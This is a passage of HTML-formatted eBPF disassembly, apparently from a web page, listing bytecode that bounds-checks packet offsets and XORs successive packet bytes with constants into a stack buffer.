*(u8 *)(r10 - 0x44) = w4</span><br><span class="line">      37:       b7 04 00 00 01 00 00 00 r4 = 0x1</span><br><span class="line">      38:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">      39:       07 05 00 00 2c 00 00 00 r5 += 0x2c</span><br><span class="line">      40:       2d 35 bb 01 00 00 00 00 if r5 &gt; r3 goto +0x1bb &lt;LBB0_71&gt;</span><br><span class="line">      41:       71 24 2b 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x2b)</span><br><span class="line">      42:       a7 04 00 00 f4 00 00 00 r4 ^= 0xf4</span><br><span class="line">      43:       73 4a bd ff 00 00 00 00 *(u8 *)(r10 - 0x43) = w4</span><br><span class="line">      44:       b7 04 00 00 02 00 00 00 r4 = 0x2</span><br><span class="line">      45:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">      46:       07 05 00 00 2d 00 00 00 r5 += 0x2d</span><br><span class="line">      47:       2d 35 b4 01 00 00 00 00 if r5 &gt; r3 goto +0x1b4 &lt;LBB0_71&gt;</span><br><span class="line">      48:       71 24 2c 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x2c)</span><br><span class="line">      49:       a7 04 00 00 84 00 00 00 r4 ^= 0x84</span><br><span class="line">      50:       73 4a be ff 00 00 00 00 *(u8 *)(r10 - 0x42) = w4</span><br><span class="line">      51:       b7 04 00 00 03 00 00 00 r4 = 0x3</span><br><span class="line">      52:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">      53:       07 05 00 00 2e 00 00 00 r5 += 0x2e</span><br><span class="line">      54:       2d 35 ad 01 00 00 00 00 if r5 &gt; r3 goto +0x1ad &lt;LBB0_71&gt;</span><br><span class="line">      55:       71 24 2d 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x2d)</span><br><span class="line">      56:       a7 04 00 00 2d 00 00 00 r4 ^= 0x2d</span><br><span class="line">      57:       73 4a bf ff 00 00 00 00 *(u8 *)(r10 - 0x41) = w4</span><br><span class="line">      58:       b7 04 00 00 04 00 00 00 r4 = 0x4</span><br><span class="line">      59:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">      60:       07 05 00 00 2f 00 00 00 r5 += 0x2f</span><br><span class="line">      61:       2d 35 a6 01 00 00 00 00 if r5 &gt; r3 goto +0x1a6 &lt;LBB0_71&gt;</span><br><span class="line">      62:       71 24 2e 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x2e)</span><br><span class="line">      63:       a7 04 00 00 04 00 00 00 r4 ^= 0x4</span><br><span class="line">      64:       73 4a c0 ff 00 00 00 00 *(u8 *)(r10 - 0x40) = w4</span><br><span class="line">      65:       b7 04 00 00 05 00 00 00 r4 = 0x5</span><br><span class="line">      66:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">      67:       07 05 00 00 30 00 00 00 r5 += 0x30</span><br><span class="line">      68:       2d 35 9f 01 00 00 00 00 if r5 &gt; r3 goto +0x19f &lt;LBB0_71&gt;</span><br><span class="line">      69:       71 24 2f 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x2f)</span><br><span class="line">      70:       a7 04 00 00 9a 00 00 00 r4 ^= 0x9a</span><br><span class="line">      71:       73 4a c1 ff 00 00 00 00 *(u8 *)(r10 - 0x3f) = w4</span><br><span class="line">      72:       b7 04 00 00 06 00 00 00 r4 = 0x6</span><br><span class="line">      73:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">      74:       07 05 00 00 31 00 00 00 r5 += 0x31</span><br><span class="line">      75:       2d 35 98 01 00 00 00 00 if r5 &gt; r3 goto +0x198 &lt;LBB0_71&gt;</span><br><span class="line">      76:       71 24 30 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x30)</span><br><span class="line">      77:       a7 04 00 00 39 00 00 00 r4 ^= 0x39</span><br><span class="line">      78:       73 4a c2 ff 00 00 00 00 *(u8 *)(r10 - 0x3e) = w4</span><br><span class="line">      79:       b7 04 00 00 07 00 00 00 r4 = 0x7</span><br><span class="line">      80:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">      81:       07 05 00 00 32 00 00 00 r5 += 0x32</span><br><span class="line">      82:       2d 35 91 01 00 00 00 00 if r5 &gt; r3 goto +0x191 &lt;LBB0_71&gt;</span><br><span class="line">      83:       71 24 31 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x31)</span><br><span class="line">      84:       a7 04 00 00 0f 00 00 00 r4 ^= 0xf</span><br><span class="line">      85:       73 4a c3 ff 00 00 00 00 *(u8 *)(r10 - 0x3d) = w4</span><br><span class="line">      86:       b7 04 00 00 08 00 00 00 r4 = 0x8</span><br><span class="line">      87:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">      88:       07 05 00 00 33 00 00 00 r5 += 0x33</span><br><span class="line">      89:       2d 35 8a 01 00 00 00 00 if r5 &gt; r3 goto +0x18a &lt;LBB0_71&gt;</span><br><span class="line">      90:       71 24 32 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x32)</span><br><span class="line">      91:       a7 04 00 00 2b 00 00 00 r4 ^= 0x2b</span><br><span class="line">      92:       73 4a c4 ff 00 00 00 00 *(u8 *)(r10 - 0x3c) = w4</span><br><span class="line">      93:       b7 04 00 00 09 00 00 00 r4 = 0x9</span><br><span class="line">      94:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">      95:       07 05 00 00 34 00 00 00 r5 += 0x34</span><br><span class="line">      96:       2d 35 83 01 00 00 00 00 if r5 &gt; r3 goto +0x183 &lt;LBB0_71&gt;</span><br><span class="line">      97:       71 24 33 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x33)</span><br><span class="line">      98:       a7 04 00 00 c0 00 00 00 r4 ^= 0xc0</span><br><span class="line">      99:       73 4a c5 ff 00 00 00 00 *(u8 *)(r10 - 0x3b) = w4</span><br><span class="line">     100:       b7 04 00 00 0a 00 00 00 r4 = 0xa</span><br><span class="line">     101:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     102:       07 05 00 00 35 00 00 00 r5 += 0x35</span><br><span class="line">     103:       2d 35 7c 01 00 00 00 00 if r5 &gt; r3 goto +0x17c &lt;LBB0_71&gt;</span><br><span class="line">     104:       71 24 34 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x34)</span><br><span class="line">     105:       a7 04 00 00 1d 00 00 00 r4 ^= 0x1d</span><br><span class="line">     106:       73 4a c6 ff 00 00 00 00 *(u8 *)(r10 - 0x3a) = w4</span><br><span class="line">     107:       b7 04 00 00 0b 00 00 00 r4 = 0xb</span><br><span class="line">     108:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     109:       07 05 00 00 36 00 00 00 r5 += 0x36</span><br><span class="line">     110:       2d 35 75 01 00 00 00 00 if r5 &gt; r3 goto +0x175 &lt;LBB0_71&gt;</span><br><span class="line">     111:       71 24 35 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x35)</span><br><span class="line">     112:       a7 04 00 00 78 00 00 00 r4 ^= 0x78</span><br><span class="line">     113:       73 4a c7 ff 00 00 00 00 *(u8 *)(r10 - 0x39) = w4</span><br><span class="line">     114:       b7 04 00 00 0c 00 00 00 r4 = 0xc</span><br><span class="line">     115:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     116:       07 05 00 00 37 00 00 00 r5 += 0x37</span><br><span class="line">     117:       2d 35 6e 01 00 00 00 00 if r5 &gt; r3 goto +0x16e &lt;LBB0_71&gt;</span><br><span class="line">     118:       71 24 36 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x36)</span><br><span class="line">     119:       a7 04 00 00 d9 00 00 00 r4 ^= 0xd9</span><br><span class="line">     120:       73 4a c8 ff 00 00 00 00 *(u8 *)(r10 - 0x38) = w4</span><br><span class="line">     121:       b7 04 00 00 0d 00 00 00 r4 = 0xd</span><br><span class="line">     122:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     123:       07 05 00 00 38 00 00 00 r5 += 0x38</span><br><span class="line">     124:       2d 35 67 01 00 00 00 00 if r5 &gt; r3 goto +0x167 &lt;LBB0_71&gt;</span><br><span class="line">     125:       71 24 37 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x37)</span><br><span class="line">     126:       a7 04 00 00 b7 00 00 00 r4 ^= 0xb7</span><br><span class="line">     127:       73 4a c9 ff 00 00 00 00 *(u8 *)(r10 - 0x37) = w4</span><br><span class="line">     128:       b7 04 00 00 0e 00 00 00 r4 = 0xe</span><br><span class="line">     129:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     130:       07 05 00 00 39 00 00 00 r5 += 0x39</span><br><span class="line">     131:       2d 35 60 01 00 00 00 00 if r5 &gt; r3 goto +0x160 &lt;LBB0_71&gt;</span><br><span class="line">     132:       71 24 38 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x38)</span><br><span class="line">     133:       a7 04 00 00 0a 00 00 00 r4 ^= 0xa</span><br><span class="line">     134:       73 4a ca ff 00 00 00 00 *(u8 *)(r10 - 0x36) = w4</span><br><span class="line">     135:       b7 04 00 00 0f 00 00 00 r4 = 0xf</span><br><span class="line">     136:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     137:       07 05 00 00 3a 00 00 00 r5 += 0x3a</span><br><span class="line">     138:       2d 35 59 01 00 00 00 00 if r5 &gt; r3 goto +0x159 &lt;LBB0_71&gt;</span><br><span class="line">     139:       71 24 39 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x39)</span><br><span class="line">     140:       a7 04 00 00 7d 00 00 00 r4 ^= 0x7d</span><br><span class="line">     141:       73 4a cb ff 00 00 00 00 *(u8 *)(r10 - 0x35) = w4</span><br><span class="line">     142:       b7 04 00 00 10 00 00 00 r4 = 0x10</span><br><span class="line">     143:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     144:       07 05 00 00 3b 00 00 00 r5 += 0x3b</span><br><span class="line">     145:       2d 35 52 01 00 00 00 00 if r5 &gt; r3 goto +0x152 &lt;LBB0_71&gt;</span><br><span class="line">     146:       71 24 3a 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x3a)</span><br><span class="line">     147:       a7 04 00 00 0b 00 00 00 r4 ^= 0xb</span><br><span class="line">     148:       73 4a cc ff 00 00 00 00 *(u8 *)(r10 - 0x34) = w4</span><br><span class="line">     149:       b7 04 00 00 11 00 00 00 r4 = 0x11</span><br><span class="line">     150:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     151:       07 05 00 00 3c 00 00 00 r5 += 0x3c</span><br><span class="line">     152:       2d 35 4b 01 00 00 00 00 if r5 &gt; r3 goto +0x14b &lt;LBB0_71&gt;</span><br><span class="line">     153:       71 24 3b 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x3b)</span><br><span class="line">     154:       a7 04 00 00 a5 00 00 00 r4 ^= 0xa5</span><br><span class="line">     155:       73 4a cd ff 00 00 00 00 *(u8 *)(r10 - 0x33) = w4</span><br><span class="line">     156:       b7 04 00 00 12 00 00 00 r4 = 0x12</span><br><span class="line">     157:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     158:       07 05 00 00 3d 00 00 00 r5 += 0x3d</span><br><span class="line">     159:       2d 35 44 01 00 00 00 00 if r5 &gt; r3 goto +0x144 &lt;LBB0_71&gt;</span><br><span class="line">     160:       71 24 3c 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x3c)</span><br><span class="line">     161:       a7 04 00 00 ba 00 00 00 r4 ^= 0xba</span><br><span class="line">     162:       73 4a ce ff 00 00 00 00 *(u8 *)(r10 - 0x32) = w4</span><br><span class="line">     163:       b7 04 00 00 13 00 00 00 r4 = 0x13</span><br><span class="line">     164:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     165:       07 05 00 00 3e 00 00 00 r5 += 0x3e</span><br><span class="line">     166:       2d 35 3d 01 00 00 00 00 if r5 &gt; r3 goto +0x13d &lt;LBB0_71&gt;</span><br><span class="line">     167:       71 24 3d 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x3d)</span><br><span class="line">     168:       a7 04 00 00 11 00 00 00 r4 ^= 0x11</span><br><span class="line">     169:       73 4a cf ff 00 00 00 00 *(u8 *)(r10 - 0x31) = w4</span><br><span class="line">     170:       b7 04 00 00 14 00 00 00 r4 = 0x14</span><br><span class="line">     171:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     172:       07 05 00 00 3f 00 00 00 r5 += 0x3f</span><br><span class="line">     173:       2d 35 36 01 00 00 00 00 if r5 &gt; r3 goto +0x136 &lt;LBB0_71&gt;</span><br><span class="line">     174:       71 24 3e 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x3e)</span><br><span class="line">     175:       a7 04 00 00 b9 00 00 00 r4 ^= 0xb9</span><br><span class="line">     176:       73 4a d0 ff 00 00 00 00 *(u8 *)(r10 - 0x30) = w4</span><br><span class="line">     177:       b7 04 00 00 15 00 00 00 r4 = 0x15</span><br><span class="line">     178:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     179:       07 05 00 00 40 00 00 00 r5 += 0x40</span><br><span class="line">     180:       2d 35 2f 01 00 00 00 00 if r5 &gt; r3 goto +0x12f &lt;LBB0_71&gt;</span><br><span class="line">     181:       71 24 3f 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x3f)</span><br><span class="line">     182:       a7 04 00 00 96 00 00 00 r4 ^= 0x96</span><br><span class="line">     183:       73 4a d1 ff 00 00 00 00 *(u8 *)(r10 - 0x2f) = w4</span><br><span class="line">     184:       b7 04 00 00 16 00 00 00 r4 = 0x16</span><br><span class="line">     185:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     186:       07 05 00 00 41 00 00 00 r5 += 0x41</span><br><span class="line">     187:       2d 35 28 01 00 00 00 00 if r5 &gt; r3 goto +0x128 &lt;LBB0_71&gt;</span><br><span class="line">     188:       71 24 40 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x40)</span><br><span class="line">     189:       a7 04 00 00 bb 00 00 00 r4 ^= 0xbb</span><br><span class="line">     190:       73 4a d2 ff 00 00 00 00 *(u8 *)(r10 - 0x2e) = w4</span><br><span class="line">     191:       b7 04 00 00 17 00 00 00 r4 = 0x17</span><br><span class="line">     192:       63 4a b8 ff 00 00 00 00 *(u32 *)(r10 - 0x48) = w4</span><br><span class="line">     193:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     194:       07 05 00 00 42 00 00 00 r5 += 0x42</span><br><span class="line">     195:       2d 35 20 01 00 00 00 00 if r5 &gt; r3 goto +0x120 &lt;LBB0_71&gt;</span><br><span class="line">     196:       71 24 41 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x41)</span><br><span class="line">     197:       a7 04 00 00 aa 00 00 00 r4 ^= 0xaa</span><br><span class="line">     198:       73 4a d3 ff 00 00 00 00 *(u8 *)(r10 - 0x2d) = w4</span><br><span class="line">     199:       b7 04 00 00 18 00 00 00 r4 = 0x18</span><br><span class="line">     200:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     201:       07 05 00 00 43 00 00 00 r5 += 0x43</span><br><span class="line">     202:       2d 35 19 01 00 00 00 00 if r5 &gt; r3 goto +0x119 &lt;LBB0_71&gt;</span><br><span class="line">     203:       71 24 42 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x42)</span><br><span class="line">     204:       a7 04 00 00 e6 00 00 00 r4 ^= 0xe6</span><br><span class="line">     205:       73 4a d4 ff 00 00 00 00 *(u8 *)(r10 - 0x2c) = w4</span><br><span class="line">     206:       b7 04 00 00 19 00 00 00 r4 = 0x19</span><br><span class="line">     207:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     208:       07 05 00 00 44 00 00 00 r5 += 0x44</span><br><span class="line">     209:       2d 35 12 01 00 00 00 00 if r5 &gt; r3 goto +0x112 &lt;LBB0_71&gt;</span><br><span class="line">     210:       71 24 43 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x43)</span><br><span class="line">     211:       a7 04 00 00 75 00 00 00 r4 ^= 0x75</span><br><span class="line">     212:       73 4a d5 ff 00 00 00 00 *(u8 *)(r10 - 0x2b) = w4</span><br><span class="line">     213:       b7 04 00 00 1a 00 00 00 r4 = 0x1a</span><br><span class="line">     214:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     215:       07 05 00 00 45 00 00 00 r5 += 0x45</span><br><span class="line">     216:       2d 35 0b 01 00 00 00 00 if r5 &gt; r3 goto +0x10b &lt;LBB0_71&gt;</span><br><span class="line">     217:       71 24 44 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x44)</span><br><span class="line">     218:       a7 04 00 00 e1 00 00 00 r4 ^= 0xe1</span><br><span class="line">     219:       73 4a d6 ff 00 00 00 00 *(u8 *)(r10 - 0x2a) = w4</span><br><span class="line">     220:       b7 04 00 00 1b 00 00 00 r4 = 0x1b</span><br><span class="line">     221:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     222:       07 05 00 00 46 00 00 00 r5 += 0x46</span><br><span class="line">     223:       2d 35 04 01 00 00 00 00 if r5 &gt; r3 goto +0x104 &lt;LBB0_71&gt;</span><br><span class="line">     224:       71 24 45 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x45)</span><br><span class="line">     225:       a7 04 00 00 ab 00 00 00 r4 ^= 0xab</span><br><span class="line">     226:       73 4a d7 ff 00 00 00 00 *(u8 *)(r10 - 0x29) = w4</span><br><span class="line">     227:       b7 04 00 00 1c 00 00 00 r4 = 0x1c</span><br><span class="line">     228:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     229:       07 05 00 00 47 00 00 00 r5 += 0x47</span><br><span class="line">     230:       2d 35 fd 00 00 00 00 00 if r5 &gt; r3 goto +0xfd &lt;LBB0_71&gt;</span><br><span class="line">     231:       71 24 46 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x46)</span><br><span class="line">     232:       a7 04 00 00 68 00 00 00 r4 ^= 0x68</span><br><span class="line">     233:       73 4a d8 ff 00 00 00 00 *(u8 *)(r10 - 0x28) = w4</span><br><span class="line">     234:       b7 04 00 00 1d 00 00 00 r4 = 0x1d</span><br><span class="line">     235:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     236:       07 05 00 00 48 00 00 00 r5 += 0x48</span><br><span class="line">     237:       2d 35 f6 00 00 00 00 00 if r5 &gt; r3 goto +0xf6 &lt;LBB0_71&gt;</span><br><span class="line">     238:       71 24 47 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x47)</span><br><span class="line">     239:       a7 04 00 00 8f 00 00 00 r4 ^= 0x8f</span><br><span class="line">     240:       73 4a d9 ff 00 00 00 00 *(u8 *)(r10 - 0x27) = w4</span><br><span class="line">     241:       b7 04 00 00 1e 00 00 00 r4 = 0x1e</span><br><span class="line">     242:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     243:       07 05 00 00 49 00 00 00 r5 += 0x49</span><br><span class="line">     244:       2d 35 ef 00 00 00 00 00 if r5 &gt; r3 goto +0xef &lt;LBB0_71&gt;</span><br><span class="line">     245:       71 24 48 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x48)</span><br><span class="line">     246:       a7 04 00 00 46 00 00 00 r4 ^= 0x46</span><br><span class="line">     247:       73 4a da ff 00 00 00 00 *(u8 *)(r10 - 0x26) = w4</span><br><span class="line">     248:       b7 04 00 00 1f 00 00 00 r4 = 0x1f</span><br><span class="line">     249:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     250:       07 05 00 00 4a 00 00 00 r5 += 0x4a</span><br><span class="line">     251:       2d 35 e8 00 00 00 00 00 if r5 &gt; r3 goto +0xe8 &lt;LBB0_71&gt;</span><br><span class="line">     252:       71 24 49 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x49)</span><br><span class="line">     253:       a7 04 00 00 58 00 00 00 r4 ^= 0x58</span><br><span class="line">     254:       73 4a db ff 00 00 00 00 *(u8 *)(r10 - 0x25) = w4</span><br><span class="line">     255:       b7 04 00 00 20 00 00 00 r4 = 0x20</span><br><span class="line">     256:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     257:       07 05 00 00 4b 00 00 00 r5 += 0x4b</span><br><span class="line">     258:       2d 35 e1 00 00 00 00 00 if r5 &gt; r3 goto +0xe1 &lt;LBB0_71&gt;</span><br><span class="line">     259:       71 24 4a 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x4a)</span><br><span class="line">     260:       a7 04 00 00 1c 00 00 00 r4 ^= 0x1c</span><br><span class="line">     261:       73 4a dc ff 00 00 00 00 *(u8 *)(r10 - 0x24) = w4</span><br><span class="line">     262:       b7 04 00 00 21 00 00 00 r4 = 0x21</span><br><span class="line">     263:       63 4a b8 ff 00 00 00 00 *(u32 *)(r10 - 0x48) = w4</span><br><span class="line">     264:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     265:       07 05 00 00 4c 00 00 00 r5 += 0x4c</span><br><span class="line">     266:       2d 35 d9 00 00 00 00 00 if r5 &gt; r3 goto +0xd9 &lt;LBB0_71&gt;</span><br><span class="line">     267:       71 24 4b 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x4b)</span><br><span class="line">     268:       a7 04 00 00 66 00 00 00 r4 ^= 0x66</span><br><span class="line">     269:       73 4a dd ff 00 00 00 00 *(u8 *)(r10 - 0x23) = w4</span><br><span class="line">     270:       b7 04 00 00 22 00 00 00 r4 = 0x22</span><br><span class="line">     271:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     272:       07 05 00 00 4d 00 00 00 r5 += 0x4d</span><br><span class="line">     273:       2d 35 d2 00 00 00 00 00 if r5 &gt; r3 goto +0xd2 &lt;LBB0_71&gt;</span><br><span class="line">     274:       71 24 4c 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x4c)</span><br><span class="line">     275:       a7 04 00 00 0e 00 00 00 r4 ^= 0xe</span><br><span class="line">     276:       73 4a de ff 00 00 00 00 *(u8 *)(r10 - 0x22) = w4</span><br><span class="line">     277:       b7 04 00 00 23 00 00 00 r4 = 0x23</span><br><span class="line">     278:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     279:       07 05 00 00 4e 00 00 00 r5 += 0x4e</span><br><span class="line">     280:       2d 35 cb 00 00 00 00 00 if r5 &gt; r3 goto +0xcb &lt;LBB0_71&gt;</span><br><span class="line">     281:       71 24 4d 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x4d)</span><br><span class="line">     282:       a7 04 00 00 42 00 00 00 r4 ^= 0x42</span><br><span class="line">     283:       73 4a df ff 00 00 00 00 *(u8 *)(r10 - 0x21) = w4</span><br><span class="line">     284:       b7 04 00 00 24 00 00 00 r4 = 0x24</span><br><span class="line">     285:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     286:       07 05 00 00 4f 00 00 00 r5 += 0x4f</span><br><span class="line">     287:       2d 35 c4 00 00 00 00 00 if r5 &gt; r3 goto +0xc4 &lt;LBB0_71&gt;</span><br><span class="line">     288:       71 24 4e 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x4e)</span><br><span class="line">     289:       a7 04 00 00 56 00 00 00 r4 ^= 0x56</span><br><span class="line">     290:       73 4a e0 ff 00 00 00 00 *(u8 *)(r10 - 0x20) = w4</span><br><span class="line">     291:       b7 04 00 00 25 00 00 00 r4 = 0x25</span><br><span class="line">     292:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     293:       07 05 00 00 50 00 00 00 r5 += 0x50</span><br><span class="line">     294:       2d 35 bd 00 00 00 00 00 if r5 &gt; r3 goto +0xbd &lt;LBB0_71&gt;</span><br><span class="line">     295:       71 24 4f 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x4f)</span><br><span class="line">     296:       a7 04 00 00 ec 00 00 00 r4 ^= 0xec</span><br><span class="line">     297:       73 4a e1 ff 00 00 00 00 *(u8 *)(r10 - 0x1f) = w4</span><br><span class="line">     298:       b7 04 00 00 26 00 00 00 r4 = 0x26</span><br><span class="line">     299:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     300:       07 05 00 00 51 00 00 00 r5 += 0x51</span><br><span class="line">     301:       2d 35 b6 00 00 00 00 00 if r5 &gt; r3 goto +0xb6 &lt;LBB0_71&gt;</span><br><span class="line">     302:       71 24 50 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x50)</span><br><span class="line">     303:       a7 04 00 00 87 00 00 00 r4 ^= 0x87</span><br><span class="line">     304:       73 4a e2 ff 00 00 00 00 *(u8 *)(r10 - 0x1e) = w4</span><br><span class="line">     305:       b7 04 00 00 27 00 00 00 r4 = 0x27</span><br><span class="line">     306:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     307:       07 05 00 00 52 00 00 00 r5 += 0x52</span><br><span class="line">     308:       2d 35 af 00 00 00 00 00 if r5 &gt; r3 goto +0xaf &lt;LBB0_71&gt;</span><br><span class="line">     309:       71 24 51 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x51)</span><br><span class="line">     310:       a7 04 00 00 5c 00 00 00 r4 ^= 0x5c</span><br><span class="line">     311:       73 4a e3 ff 00 00 00 00 *(u8 *)(r10 - 0x1d) = w4</span><br><span class="line">     312:       b7 04 00 00 28 00 00 00 r4 = 0x28</span><br><span class="line">     313:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     314:       07 05 00 00 53 00 00 00 r5 += 0x53</span><br><span class="line">     315:       2d 35 a8 00 00 00 00 00 if r5 &gt; r3 goto +0xa8 &lt;LBB0_71&gt;</span><br><span class="line">     316:       71 24 52 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x52)</span><br><span class="line">     317:       a7 04 00 00 c5 00 00 00 r4 ^= 0xc5</span><br><span class="line">     318:       73 4a e4 ff 00 00 00 00 *(u8 *)(r10 - 0x1c) = w4</span><br><span class="line">     319:       b7 04 00 00 29 00 00 00 r4 = 0x29</span><br><span class="line">     320:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     321:       07 05 00 00 54 00 00 00 r5 += 0x54</span><br><span class="line">     322:       2d 35 a1 00 00 00 00 00 if r5 &gt; r3 goto +0xa1 &lt;LBB0_71&gt;</span><br><span class="line">     323:       71 24 53 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x53)</span><br><span class="line">     324:       a7 04 00 00 7f 00 00 00 r4 ^= 0x7f</span><br><span class="line">     325:       73 4a e5 ff 00 00 00 00 *(u8 *)(r10 - 0x1b) = w4</span><br><span class="line">     326:       b7 04 00 00 2a 00 00 00 r4 = 0x2a</span><br><span class="line">     327:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     328:       07 05 00 00 55 00 00 00 r5 += 0x55</span><br><span class="line">     329:       2d 35 9a 00 00 00 00 00 if r5 &gt; r3 goto +0x9a &lt;LBB0_71&gt;</span><br><span class="line">     330:       71 24 54 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x54)</span><br><span class="line">     331:       a7 04 00 00 53 00 00 00 r4 ^= 0x53</span><br><span class="line">     332:       73 4a e6 ff 00 00 00 00 *(u8 *)(r10 - 0x1a) = w4</span><br><span class="line">     333:       b7 04 00 00 2b 00 00 00 r4 = 0x2b</span><br><span class="line">     334:       63 4a b8 ff 00 00 00 00 *(u32 *)(r10 - 0x48) = w4</span><br><span class="line">     335:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     336:       07 05 00 00 56 00 00 00 r5 += 0x56</span><br><span class="line">     337:       2d 35 92 00 00 00 00 00 if r5 &gt; r3 goto +0x92 &lt;LBB0_71&gt;</span><br><span class="line">     338:       71 24 55 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x55)</span><br><span class="line">     339:       a7 04 00 00 2d 00 00 00 r4 ^= 0x2d</span><br><span class="line">     340:       73 4a e7 ff 00 00 00 00 *(u8 *)(r10 - 0x19) = w4</span><br><span class="line">     341:       b7 04 00 00 2c 00 00 00 r4 = 0x2c</span><br><span class="line">     342:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     343:       07 05 00 00 57 00 00 00 r5 += 0x57</span><br><span class="line">     344:       2d 35 8b 00 00 00 00 00 if r5 &gt; r3 goto +0x8b &lt;LBB0_71&gt;</span><br><span class="line">     345:       71 24 56 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x56)</span><br><span class="line">     346:       a7 04 00 00 1d 00 00 00 r4 ^= 0x1d</span><br><span class="line">     347:       73 4a e8 ff 00 00 00 00 *(u8 *)(r10 - 0x18) = w4</span><br><span class="line">     348:       b7 04 00 00 2d 00 00 00 r4 = 0x2d</span><br><span class="line">     349:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     350:       07 05 00 00 58 00 00 00 r5 += 0x58</span><br><span class="line">     351:       2d 35 84 00 00 00 00 00 if r5 &gt; r3 goto +0x84 &lt;LBB0_71&gt;</span><br><span class="line">     352:       71 24 57 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x57)</span><br><span class="line">     353:       a7 04 00 00 33 00 00 00 r4 ^= 0x33</span><br><span class="line">     354:       73 4a e9 ff 00 00 00 00 *(u8 *)(r10 - 0x17) = w4</span><br><span class="line">     355:       b7 04 00 00 2e 00 00 00 r4 = 0x2e</span><br><span class="line">     356:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     357:       07 05 00 00 59 00 00 00 r5 += 0x59</span><br><span class="line">     358:       2d 35 7d 00 00 00 00 00 if r5 &gt; r3 goto +0x7d &lt;LBB0_71&gt;</span><br><span class="line">     359:       71 